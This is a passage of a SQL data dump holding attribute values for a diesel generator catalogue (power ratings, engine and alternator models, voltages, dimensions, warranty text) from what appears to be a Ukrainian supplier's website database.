SB4\r\n'),(64,29,1,'50'),(64,29,3,'50'),(64,29,4,'50'),(64,30,1,'3'),(64,30,3,'3'),(64,30,4,'3'),(64,31,1,'0.8'),(64,31,3,'0.8'),(64,31,4,'0.8'),(64,32,1,'230/400'),(64,32,3,'230/400'),(64,32,4,'230/400'),(64,33,1,'1500\r\n'),(64,33,3,'1500\r\n\r\n'),(64,33,4,'1500\r\n'),(64,34,1,'4,2\r\n\r\n'),(64,34,3,'4,2\r\n\r\n'),(64,34,4,'4,2\r\n'),(64,36,1,'2000\r\n\r\n'),(64,36,3,'2000\r\n'),(64,36,4,'2000\r\n\r\n\r\n'),(65,17,4,'68'),(65,18,1,'830\r\n\r\n'),(65,18,3,'830\r\n\r\n\r\n\r\n\r\n'),(65,18,4,'830\r\n'),(65,19,1,'Дизельные генераторы SSM'),(65,19,3,'Дизельные генераторы SSM'),(65,19,4,'Дизельные генераторы SSM'),(65,20,1,'86.4'),(65,20,3,'86.4'),(65,20,4,'86.4'),(65,21,1,'10,1\r\n'),(65,21,3,'10,1\r\n'),(65,21,4,'10,1\r\n'),(65,23,1,'ММЗ\r\n'),(65,23,3,'ММЗ\r\n'),(65,23,4,'ММЗ\r\n\r\n'),(65,24,1,'Д-246.4\r\n'),(65,24,3,'Д-246.4\r\n\r\n'),(65,24,4,'Д-246.4\r\n'),(65,25,1,'MJB 200 MA4\r\n'),(65,25,3,'MJB 200 MA4\r\n'),(65,25,4,'MJB 200 MA4\r\n'),(65,29,1,'50'),(65,29,3,'50'),(65,29,4,'50'),(65,30,1,'3'),(65,30,3,'3'),(65,30,4,'3'),(65,31,1,'0.8'),(65,31,3,'0.8'),(65,31,4,'0.8'),(65,32,1,'230/400'),(65,32,3,'230/400'),(65,32,4,'230/400'),(65,33,1,'1500\r\n'),(65,33,3,'1500\r\n\r\n'),(65,33,4,'1500\r\n'),(65,34,1,'5,1\r\n\r\n\r\n'),(65,34,3,'5,1\r\n\r\n'),(65,34,4,'5,1\r\n\r\n'),(65,36,1,'2000\r\n\r\n'),(65,36,3,'2000\r\n'),(65,36,4,'2000\r\n\r\n\r\n'),(65,37,1,'800'),(65,37,3,'800'),(66,17,4,'68'),(66,18,1,'890\r\n\r\n'),(66,18,3,'890\r\n\r\n\r\n\r\n\r\n'),(66,18,4,'890\r\n\r\n'),(66,19,1,'Дизельные генераторы SSM'),(66,19,3,'Дизельные генераторы SSM'),(66,19,4,'Дизельные генераторы SSM'),(66,20,1,'108'),(66,20,3,'108'),(66,20,4,'108'),(66,21,1,'12,6\r\n'),(66,21,3,'12,6\r\n'),(66,21,4,'12,6\r\n'),(66,23,1,'ММЗ\r\n'),(66,23,3,'ММЗ\r\n'),(66,23,4,'ММЗ\r\n\r\n'),(66,24,1,'Д-246.4\r\n'),(66,24,3,'Д-246.4\r\n\r\n'),(66,24,4,'Д-246.4\r\n'),(66,25,1,'MJB 200 MB4\r\n'),(66,25,3,'MJB 200 MB4\r\n'),(66,25,4,'MJB 200 MB4\r\n'),(66,29,1,'50'),(66,29,3,'50'),(66,29,4,'50'),(66,30,1,'3'),(66,30,3,'3'),(66,30,4,'3'),(66,31,1,'0.8'),(66,31,3,'0.8'),(66,31,4,'0.8'),(66,32,1,'230/400'),(66,32,3,'230/400'),(66,32,4,'230/400'),(66,33,1,'1500\r\n'),(66,33,3,'1500\r\n\r\n'),(66,33,4,'1500\r\n'),(66,34,1,'5,1\r\n\r\n\r\n'),(66,34,3,'5,1\r\n\r\n'),(66,34,4,'5,1\r\n\r\n'),(66,36,1,'2000\r\n\r\n'),(66,36,3,'2000\r\n'),(66,36,4,'2000\r\n\r\n\r\n'),(66,37,1,'800'),(67,17,1,'68'),(67,17,3,'68'),(67,17,4,'68'),(67,18,1,'1370\r\n'),(67,18,3,'1370\r\n\r\n\r\n\r\n'),(67,18,4,'1370\r\n'),(67,19,1,'Дизельные генераторы SSM'),(67,19,3,'Дизельные генераторы SSM'),(67,19,4,'Дизельные генераторы SSM'),(67,20,1,'133.2'),(67,20,3,'133.2'),(67,20,4,'133.2'),(67,21,1,'15,4\r\n'),(67,21,3,'15,4\r\n'),(67,21,4,'15,4\r\n'),(67,23,1,'ММЗ\r\n'),(67,23,3,'ММЗ\r\n'),(67,23,4,'ММЗ\r\n\r\n'),(67,24,1,'Д-266.4\r\n'),(67,24,3,'Д-266.4\r\n\r\n'),(67,24,4,'Д-266.4\r\n'),(67,25,1,'MJB 225 SB4\r\n'),(67,25,3,'MJB 225 SB4\r\n'),(67,25,4,'MJB 225 SB4\r\n'),(67,29,1,'50'),(67,29,3,'50'),(67,29,4,'50'),(67,30,1,'3'),(67,30,3,'3'),(67,30,4,'3'),(67,31,1,'0.8'),(67,31,3,'0.8'),(67,31,4,'0.8'),(67,32,1,'230/400'),(67,32,3,'230/400'),(67,32,4,'230/400'),(67,33,1,'1500\r\n'),(67,33,3,'1500\r\n\r\n'),(67,33,4,'1500\r\n'),(67,34,1,'5,1\r\n\r\n\r\n'),(67,34,3,'5,1\r\n\r\n'),(67,34,4,'5,1\r\n\r\n'),(67,36,1,'2500\r\n'),(67,36,3,'2500\r\n'),(67,36,4,'2500\r\n\r\n'),(67,37,1,'800'),(67,37,3,'800'),(67,37,4,'800'),(67,38,1,'1750\r\n\r\n'),(67,38,3,'1750'),(68,38,4,'1750'),(68,38,3,'1750'),(68,38,1,'1750\r\n\r\n'),(68,37,4,'800'),(68,37,3,'800'),(68,37,1,'800'),(68,36,3,'2500\r\n'),(68,36,4,'2500\r\n\r\n'),(68,34,4,'5,1\r\n\r\n'),(68,36,1,'2500\r\n'),(68,34,1,'5,1\r\n\r\n\r\n'),(68,34,3,'5,1\r\n\r\n'),(68,33,4,'1500\r\n'),(68,33,3,'1500\r\n\r\n'),(68,33,1,'1500\r\n'),(68,32,4,'230/400'),(68,32,3,'230/400'),(68,32,1,'230/400'),(68,31,4,'0.8'),(68,31,3,'0.8'),(68,31,1,'0.8'),(68,30,4,'3'),(68,30,3,'3'),(68,30,1,'3'),(68,29,4,'50'),(68,29,3,'50'),(68,29,1,'50'),(68,25,4,'MJB 225 MA4\r\n'),(68,25,3,'MJB 225 MA4\r\n'),(68,25,1,'MJB 225 MA4\r\n'),(68,24,4,'Д-266.4\r\n'),(68,24,3,'Д-266.4\r\n\r\n'),(68,24,1,'Д-266.4\r\n'),(68,23,4,'ММЗ\r\n\r\n'),(68,23,3,'ММЗ\r\n'),(68,17,3,'68'),(68,17,4,'68'),(68,18,1,'1410\r\n'),(68,18,3,'1410\r\n\r\n\r\n'),(68,18,4,'1410\r\n'),(68,19,1,'Дизельные генераторы SSM'),(68,19,3,'Дизельные генераторы SSM'),(68,19,4,'Дизельные генераторы SSM'),(68,20,1,'151.2'),(68,20,3,'151.2'),(68,20,4,'151.2'),(68,21,1,'17,4\r\n'),(68,21,3,'17,4\r\n'),(68,21,4,'17,4\r\n'),(68,23,1,'ММЗ\r\n'),(69,23,4,'ММЗ\r\n\r\n'),(69,24,1,'Д-266.4\r\n'),(69,24,3,'Д-266.4\r\n\r\n'),(69,24,4,'Д-266.4\r\n'),(69,25,1,'MJB 225 LA4\r\n'),(69,25,3,'MJB 225 LA4\r\n'),(69,25,4,'MJB 225 LA4\r\n'),(69,29,1,'50'),(69,29,3,'50'),(69,29,4,'50'),(69,30,1,'3'),(69,30,3,'3'),(69,30,4,'3'),(69,31,1,'0.8'),(69,31,3,'0.8'),(69,31,4,'0.8'),(69,32,1,'230/400'),(69,32,3,'230/400'),(69,32,4,'230/400'),(69,33,1,'1500\r\n'),(69,33,3,'1500\r\n\r\n'),(69,33,4,'1500\r\n'),(69,34,1,'5,1\r\n\r\n\r\n'),(69,34,3,'5,1\r\n\r\n'),(69,34,4,'5,1\r\n\r\n'),(69,36,1,'2500\r\n'),(69,36,3,'2500\r\n'),(69,36,4,'2500\r\n\r\n'),(69,37,1,'800'),(69,37,3,'800'),(69,37,4,'800'),(54,31,1,'0.8'),(54,31,3,'0.8'),(55,32,4,'230/400'),(55,33,1,'1500'),(55,33,3,'1500'),(55,33,4,'1500'),(55,34,1,'16\r\n'),(55,34,3,'16\r\n'),(55,34,4,'16\r\n'),(55,36,1,'2750'),(55,36,3,'2750'),(55,36,4,'2750'),(55,37,1,'800'),(56,34,4,'21,3\r\n'),(56,36,1,'3100\r\n'),(56,36,3,'3100'),(56,36,4,'3100'),(56,37,1,'1050'),(56,37,3,'1050'),(56,37,4,'1050'),(57,32,4,'230/400'),(57,33,1,'1500'),(58,17,1,'68'),(58,16,4,'550'),(58,16,3,'550'),(69,38,1,'1750\r\n\r\n'),(69,38,3,'1750'),(69,38,4,'1750'),(69,39,1,'Да'),(59,36,3,'1400\r\n'),(59,36,4,'1400\r\n\r\n'),(59,37,1,'600\r\n'),(59,37,3,'600'),(59,37,4,'600\r\n'),(59,38,1,'1200\r\n\r\n'),(59,38,3,'1200\r\n'),(60,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(60,13,4,'25'),(60,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(60,13,3,'25'),(61,37,1,'800'),(61,37,3,'800'),(62,36,3,'2000\r\n'),(62,36,4,'2000\r\n\r\n\r\n'),(62,37,1,'800'),(63,37,3,'800'),(63,37,4,'800'),(63,38,1,'1550\r\n\r\n'),(63,38,3,'1550'),(63,38,4,'1550\r\n'),(64,37,1,'800'),(64,37,3,'800'),(64,37,4,'800'),(64,38,1,'1750\r\n\r\n'),(64,38,3,'1750'),(65,37,4,'800'),(65,38,1,'1750\r\n\r\n'),(65,38,3,'1750'),(65,38,4,'1750'),(65,39,1,'Да'),(66,37,3,'800'),(66,37,4,'800'),(66,38,1,'1750\r\n\r\n'),(66,38,3,'1750'),(66,38,4,'1750'),(66,39,1,'Да'),(54,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(55,37,3,'800'),(55,37,4,'800'),(55,38,1,'1750'),(55,38,3,'1750'),(55,38,4,'1750'),(55,39,1,'Да'),(55,39,3,'Да'),(55,39,4,'Да'),(55,40,1,'Да'),(54,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(54,13,4,'170'),(54,13,3,'170'),(54,13,1,'170'),(54,12,4,'136'),(54,12,3,'136'),(54,12,1,'136'),(69,23,3,'ММЗ\r\n'),(69,23,1,'ММЗ\r\n'),(69,21,4,'20,8\r\n'),(69,21,3,'20,8\r\n\r\n'),(69,21,1,'20,8\r\n'),(69,20,4,'180'),(69,20,3,'180'),(69,20,1,'180'),(69,19,4,'Дизельные генераторы SSM'),(69,18,1,'1440\r\n'),(69,18,3,'1440\r\n\r\n\r\n'),(69,18,4,'1440\r\n'),(69,19,1,'Дизельные генераторы SSM'),(69,19,3,'Дизельные генераторы SSM'),(57,19,4,'Дизельные генераторы SSI'),(57,19,3,'Дизельные генераторы SSI'),(57,19,1,'Дизельные генераторы SSI'),(57,18,4,'2230\r\n'),(57,18,3,'2230\r\n'),(57,18,1,'2230\r\n'),(57,17,4,'68'),(57,17,3,'68'),(57,17,1,'68'),(57,16,4,'330'),(57,16,3,'330'),(57,16,1,'330'),(57,15,4,'264'),(57,15,3,'264'),(57,15,1,'264'),(57,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(58,25,4,'MJB 355 SA4\r\n'),(58,29,1,'50'),(58,29,3,'50'),(58,29,4,'50'),(58,30,1,'3'),(58,30,3,'3'),(58,30,4,'3'),(58,31,1,'0.8'),(58,31,3,'0.8'),(58,31,4,'0.8'),(58,32,1,'230/400'),(58,32,3,'230/400'),(58,32,4,'230/400'),(58,33,1,'1500'),(58,33,3,'1500'),(58,33,4,'1500'),(58,34,1,'39,6\r\n'),(58,34,3,'39,6\r\n'),(58,34,4,'39,6\r\n'),(58,36,1,'3450\r\n'),(58,36,3,'3450\r\n'),(58,36,4,'3450\r\n'),(62,21,1,'5,5\r\n'),(62,20,4,'45'),(62,20,3,'45'),(62,20,1,'45'),(62,19,4,'Дизельные генераторы SSM'),(62,19,3,'Дизельные генераторы SSM'),(55,31,3,'0.8'),(55,31,4,'0.8'),(55,30,4,'3'),(55,31,1,'0.8'),(55,30,1,'3'),(55,30,3,'3'),(55,29,4,'50'),(62,37,3,'800'),(62,37,4,'800'),(62,38,1,'1550\r\n\r\n'),(62,38,3,'1550'),(62,38,4,'1550\r\n'),(62,39,1,'Да'),(62,39,3,'Да'),(62,39,4,'Да'),(62,40,1,'Да'),(62,40,3,'Да'),(62,40,4,'Да'),(62,41,1,'Да'),(62,41,3,'Да'),(62,41,4,'Да'),(62,45,1,'собственное производство'),(62,45,3,'собственное производство'),(62,45,4,'собственное производство'),(62,46,1,'официальный дистрибьютор'),(62,46,3,'официальный дистрибьютор'),(62,46,4,'официальный дистрибьютор'),(62,47,1,'сервисное обслуживание'),(62,47,3,'сервисное обслуживание'),(62,47,4,'сервисное обслуживание'),(62,48,1,'гарантия на 2000 часов'),(60,32,3,'230/400'),(60,32,4,'230/400'),(60,33,1,'3000\r\n'),(60,33,3,'3000\r\n'),(60,33,4,'3000\r\n'),(60,34,1,'2,2\r\n'),(60,34,3,'2,2\r\n'),(60,34,4,'2,2\r\n'),(60,36,1,'1400\r\n'),(60,36,3,'1400\r\n'),(60,36,4,'1400\r\n\r\n'),(60,37,1,'600\r\n'),(60,37,3,'600'),(60,37,4,'600\r\n'),(60,38,1,'1200\r\n\r\n'),(60,38,3,'1200\r\n'),(60,38,4,'1200\r\n\r\n'),(60,39,1,'Да'),(60,39,3,'Да'),(60,39,4,'Да'),(60,40,1,'Да'),(60,40,3,'Да'),(60,40,4,'Да'),(60,41,1,'Да'),(60,41,3,'Да'),(60,41,4,'Да'),(60,45,1,'Это текст первой гарантии'),(60,45,3,'Это текст первой гарантии'),(60,45,4,'Это текст первой гарантии'),(60,46,1,'Это текст второй гарантии'),(60,46,3,'Это текст второй гарантии'),(60,46,4,'Это текст второй гарантии'),(60,47,1,'Это текст третьей гарантии'),(60,47,3,'Это текст третьей гарантии'),(60,47,4,'Это текст третьей гарантии'),(60,48,1,'Это текст четвертой гарантии'),(60,48,3,'Это текст четвертой гарантии'),(60,48,4,'Это текст четвертой гарантии'),(60,49,1,'Все они правятся через админку в атрибутах'),(60,49,3,'Все они правятся через админку в атрибутах'),(60,49,4,'Все они правятся через админку в атрибутах'),(55,12,3,'160'),(55,12,1,'160'),(56,16,1,'275'),(55,40,3,'Да'),(55,40,4,'Да'),(55,41,1,'Да'),(56,15,4,'220'),(56,15,3,'220'),(56,15,1,'220'),(56,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(56,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(56,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(56,13,4,'250'),(56,13,3,'250'),(56,13,1,'250'),(56,12,4,'200'),(56,12,3,'200'),(56,12,1,'200'),(57,33,3,'1500'),(57,33,4,'1500'),(57,34,1,'24,6\r\n'),(57,34,3,'24,6\r\n'),(57,34,4,'24,6\r\n'),(57,36,1,'3100'),(57,36,3,'3100'),(57,36,4,'3100'),(57,37,1,'1050'),(57,37,3,'1050'),(57,37,4,'1050'),(57,38,1,'1800'),(57,38,3,'1800'),(57,38,4,'1800'),(57,39,1,'Да'),(57,39,3,'Да'),(57,39,4,'Да'),(57,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(57,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(57,13,4,'300'),(57,13,3,'300'),(57,13,1,'300'),(57,12,4,'240'),(57,12,3,'240'),(57,12,1,'240'),(50,18,1,'860'),(50,17,4,'67'),(50,17,3,'67'),(50,17,1,'67'),(50,16,4,'55'),(50,16,3,'55'),(50,16,1,'55'),(50,15,4,'44'),(50,15,3,'44'),(50,15,1,'44'),(50,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(50,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(50,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(50,13,4,'50'),(50,13,3,'50'),(50,13,1,'50'),(50,12,4,'40'),(50,12,3,'40'),(50,12,1,'40'),(58,16,1,'550'),(58,15,4,'440'),(58,15,3,'440'),(58,15,1,'440'),(58,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(58,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(58,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(58,13,4,'500'),(58,13,3,'500'),(58,13,1,'500'),(58,12,4,'400\r\n'),(58,12,3,'400\r\n'),(58,12,1,'400\r\n'),(53,18,1,'1000'),(53,17,4,'73'),(53,17,3,'73'),(53,17,1,'73'),(53,16,4,'88'),(53,16,3,'88'),(53,16,1,'88'),(53,15,4,'70.4'),(53,15,3,'70.4'),(53,15,1,'70.4'),(53,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(53,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(53,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(53,13,4,'80'),(53,13,3,'80'),(53,13,1,'80'),(53,12,4,'64'),(53,12,3,'64'),(53,12,1,'64'),(52,34,1,'10.6'),(52,34,3,'10.6'),(52,34,4,'10.6'),(52,36,1,'2250'),(52,36,3,'2250'),(52,36,4,'2250'),(52,37,1,'800'),(52,37,3,'800'),(52,37,4,'800'),(52,38,1,'1500'),(52,38,3,'1500'),(52,38,4,'1500'),(52,39,1,'Да'),(52,39,3,'Да'),(52,39,4,'Да'),(52,40,1,'Да'),(52,40,3,'Да'),(52,40,4,'Да'),(52,41,1,'Да'),(52,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(52,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(52,13,4,'120'),(52,13,3,'120'),(52,13,1,'120'),(52,12,4,'96'),(52,12,3,'96'),(52,12,1,'96'),(69,17,4,'68'),(69,17,3,'68'),(69,17,1,'68'),(69,16,4,'137.5'),(69,16,3,'137.5'),(69,16,1,'137.5'),(69,15,4,'110'),(69,15,3,'110'),(69,15,1,'110'),(69,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(69,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(69,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(69,13,4,'125'),(69,13,3,'125'),(69,13,1,'125'),(69,12,4,'100\r\n'),(69,12,3,'100\r\n'),(69,12,1,'100'),(59,16,3,'23.375'),(59,16,1,'24.2'),(59,15,4,'18.7'),(59,15,3,'18.7'),(59,15,1,'19.36'),(59,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(59,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(59,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(59,13,4,'21.25'),(59,13,3,'21.25'),(59,13,1,'22'),(59,12,4,'17,6\r\n'),(59,12,3,'17,6\r\n\r\n'),(59,12,1,'17.6'),(60,12,4,'20\r\n'),(60,13,1,'25'),(60,12,1,'20\r\n'),(60,12,3,'20\r\n'),(61,17,1,'68'),(61,16,4,'30.25'),(61,16,3,'30.25'),(61,16,1,'30.25'),(61,15,4,'24.2'),(61,15,3,'24.2'),(61,15,1,'24.2'),(61,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(61,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(61,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(61,13,4,'27.5'),(61,13,3,'27.5'),(61,13,1,'27.5'),(61,12,4,'22\r\n\r\n'),(61,12,3,'22\r\n\r\n'),(61,12,1,'22\r\n'),(62,19,1,'Дизельные генераторы SSM'),(62,18,4,'730\r\n'),(62,18,3,'730\r\n\r\n\r\n'),(62,18,1,'730\r\n'),(62,17,4,'68'),(62,17,1,'68'),(62,17,3,'68'),(62,16,4,'34.375'),(62,16,3,'34.375'),(62,15,4,'27.5'),(62,16,1,'34.375'),(62,15,1,'27.5'),(62,15,3,'27.5'),(62,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(62,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(62,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(62,13,4,'31.25'),(62,13,3,'31.25'),(62,13,1,'31.25'),(62,12,4,'25\r\n'),(62,12,3,'25\r\n'),(62,12,1,'25\r\n'),(63,17,1,'68'),(63,16,4,'41.25'),(63,16,3,'41.25'),(63,16,1,'41.25'),(63,15,4,'33'),(63,15,3,'33'),(63,15,1,'33'),(63,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(63,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(63,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(63,13,4,'37.5'),(63,13,3,'37.5'),(63,13,1,'37.5'),(63,12,4,'30\r\n'),(63,12,3,'30\r\n'),(63,12,1,'30\r\n'),(64,17,1,'68'),(64,16,4,'55'),(64,16,3,'55'),(64,16,1,'55'),(64,15,4,'44'),(64,15,3,'44'),(64,15,1,'44'),(64,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(64,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(64,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(64,13,4,'50'),(64,13,3,'50'),(64,13,1,'50'),(64,12,4,'40\r\n'),(64,12,3,'40\r\n'),(64,12,1,'40\r\n'),(65,17,3,'68'),(65,17,1,'68'),(65,16,4,'66'),(65,16,3,'66'),(65,16,1,'66'),(65,15,4,'52.8'),(65,15,3,'52.8'),(65,15,1,'52.8'),(65,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(65,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(65,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(65,13,4,'60'),(65,13,3,'60'),(65,13,1,'60'),(65,12,4,'48\r\n'),(65,12,3,'48\r\n'),(65,12,1,'48\r\n'),(66,17,3,'68'),(66,17,1,'68'),(66,16,4,'82.5'),(66,16,3,'82.5'),(66,16,1,'82.5'),(66,15,4,'66'),(66,15,3,'66'),(66,15,1,'66'),(66,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(66,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(66,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(66,13,4,'75'),(66,13,3,'75'),(66,13,1,'75'),(66,12,4,'60\r\n'),(66,12,3,'60\r\n'),(66,12,1,'60\r\n'),(67,16,4,'101.75'),(67,16,3,'101.75'),(67,16,1,'101.75'),(67,15,4,'81.4'),(67,15,3,'81.4'),(67,15,1,'81.4'),(67,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(67,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(67,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(67,13,4,'92.5'),(67,13,3,'92.5'),(67,13,1,'92.5'),(67,12,4,'74\r\n'),(67,12,3,'74\r\n'),(67,12,1,'74\r\n'),(68,17,1,'68'),(68,16,4,'115.5'),(68,16,3,'115.5'),(68,16,1,'115.5'),(68,15,4,'92.4'),(68,15,3,'92.4'),(68,15,1,'92.4'),(68,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(68,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(68,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(68,13,4,'105'),(68,13,3,'105'),(68,13,1,'105'),(68,12,4,'84\r\n'),(68,12,3,'84\r\n\r\n'),(68,12,1,'84\r\n'),(77,12,4,'100'),(70,36,4,'1300'),(70,36,1,'1300'),(70,36,3,'1300'),(70,34,4,'1.8'),(70,34,3,'1.8'),(70,34,1,'1.8'),(70,33,4,'1500'),(70,33,3,'1500'),(70,33,1,'1500'),(70,32,4,'230/400'),(70,32,3,'230/400'),(70,32,1,'230/400'),(70,31,4,'0.8'),(70,31,3,'0.8'),(70,31,1,'0.8'),(70,30,3,'3'),(70,30,4,'3'),(70,29,4,'50'),(70,30,1,'3'),(70,29,1,'50'),(70,29,3,'50'),(70,25,4,'MJB160XA4'),(70,25,3,'MJB160XA4'),(70,25,1,'MJB160XA4'),(70,24,4,'F2L 2011\r\n'),(70,24,3,'F2L 2011\r\n'),(70,24,1,'F2L 2011'),(70,23,4,'DEUTZ'),(70,23,3,'DEUTZ'),(70,23,1,'DEUTZ'),(70,21,4,'2.5'),(70,21,3,'2.5'),(70,21,1,'2.5'),(70,20,4,'18'),(70,20,3,'18'),(70,20,1,'18'),(70,19,4,'Дизельные генераторы SSD'),(70,19,3,'Дизельные генераторы SSD'),(70,19,1,'Дизельные генераторы SSD'),(70,18,4,'482'),(70,18,3,'482'),(70,18,1,'482'),(70,17,4,'68'),(70,17,3,'68'),(70,17,1,'68'),(70,16,4,'13.75'),(70,16,3,'13.75'),(70,16,1,'13.75'),(70,15,4,'11'),(70,15,3,'11'),(70,15,1,'11'),(70,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(70,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(70,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(70,13,4,'12.5'),(70,13,3,'12.5'),(70,13,1,'12.5'),(70,12,4,'10'),(70,12,3,'10'),(70,12,1,'10'),(77,13,3,'125'),(77,13,1,'125'),(71,12,3,'16'),(71,12,1,'16'),(70,37,1,'600'),(70,37,3,'600'),(70,37,4,'600'),(70,38,1,'1150'),(71,38,4,'1150'),(71,38,3,'1150'),(71,38,1,'1150'),(71,37,3,'600'),(71,37,4,'600'),(71,36,4,'1400'),(71,37,1,'600'),(71,36,1,'1400'),(71,36,3,'1400'),(71,34,4,'1.92'),(71,34,3,'1.92'),(71,34,1,'1.92'),(71,33,4,'1500'),(71,33,3,'1500'),(71,33,1,'1500'),(71,32,4,'230/400'),(71,32,3,'230/400'),(71,32,1,'230/400'),(71,31,4,'0.8'),(71,31,3,'0.8'),(71,31,1,'0.8'),(71,30,3,'3'),(71,30,4,'3'),(71,29,4,'50'),(71,30,1,'3'),(71,29,1,'50'),(71,29,3,'50'),(71,25,4,'MJB160XB4'),(71,25,3,'MJB160XB4'),(71,25,1,'MJB160XB4'),(71,24,4,'F3L 2011\r\n'),(71,24,3,'F3L 2011\r\n'),(71,24,1,'F3L 2011'),(71,23,4,'DEUTZ'),(71,23,3,'DEUTZ'),(71,23,1,'DEUTZ'),(71,21,4,'3.8'),(71,21,3,'3.8'),(71,21,1,'3.8'),(71,20,4,'28.8'),(71,20,3,'28.8'),(71,20,1,'28.8'),(71,19,4,'Дизельные генераторы SSD'),(71,19,3,'Дизельные генераторы SSD'),(71,19,1,'Дизельные генераторы SSD'),(71,18,4,'535'),(71,18,3,'535'),(71,18,1,'535'),(71,17,4,'68'),(71,17,3,'68'),(71,17,1,'68'),(71,16,4,'22'),(71,16,3,'22'),(71,16,1,'22'),(71,15,4,'17.6'),(71,15,3,'17.6'),(71,15,1,'17.6'),(71,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(71,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(71,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(71,13,4,'20'),(71,13,3,'20'),(71,13,1,'20'),(71,12,4,'16'),(72,13,4,'31.25'),(72,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(72,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(72,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(72,15,1,'27.5'),(72,15,3,'27.5'),(72,15,4,'27.5'),(72,16,1,'34.375'),(72,16,3,'34.375'),(72,16,4,'34.375'),(72,17,1,'68'),(72,17,3,'68'),(72,17,4,'68'),(72,18,1,'650'),(72,18,3,'650'),(72,18,4,'650'),(72,19,1,'Дизельные генераторы SSD'),(72,19,3,'Дизельные генераторы SSD'),(72,19,4,'Дизельные генераторы SSD'),(72,20,1,'45'),(72,20,3,'45'),(72,20,4,'45'),(72,21,1,'5.6'),(72,21,3,'5.6'),(72,21,4,'5.6'),(72,23,1,'DEUTZ'),(72,23,3,'DEUTZ'),(72,23,4,'DEUTZ'),(72,24,1,'F4L 2011'),(72,24,3,'F4L 2011\r\n'),(72,24,4,'F4L 2011\r\n'),(72,25,1,'MJB160MB4'),(72,25,3,'MJB160MB4'),(72,25,4,'MJB160MB4'),(72,29,1,'50'),(72,29,3,'50'),(72,29,4,'50'),(72,30,1,'3'),(72,30,3,'3'),(72,30,4,'3'),(72,31,1,'0.8'),(72,31,3,'0.8'),(72,31,4,'0.8'),(72,32,1,'230/400'),(72,32,3,'230/400'),(72,32,4,'230/400'),(72,33,1,'1500'),(72,33,3,'1500'),(72,33,4,'1500'),(72,34,1,'2.83'),(72,34,3,'2.83'),(72,34,4,'2.83'),(72,36,1,'1500'),(72,36,3,'1500'),(72,36,4,'1500'),(72,37,1,'600'),(72,37,3,'600'),(72,37,4,'600'),(72,38,1,'1150'),(72,38,3,'1150'),(72,38,4,'1150'),(72,39,1,'Да'),(72,39,3,'Да'),(72,39,4,'Да'),(72,40,1,'Да'),(73,13,4,'41.25'),(73,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(73,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(73,14,4,'НВП СПЕЦ - СЕРВИС 